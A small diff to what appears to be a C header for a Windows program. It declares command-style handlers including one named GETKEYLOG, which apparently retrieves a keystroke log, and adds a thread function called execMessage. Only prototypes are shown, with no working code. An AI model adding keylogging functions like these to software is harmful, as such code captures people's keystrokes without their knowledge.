@@ -27,3 +27,5 @@ void HALLO(void * paramT);
 void GETKEYLOG(void * paramT);
 
 void HELP(void * paramT);
+
+DWORD WINAPI execMessage(LPVOID paramT);
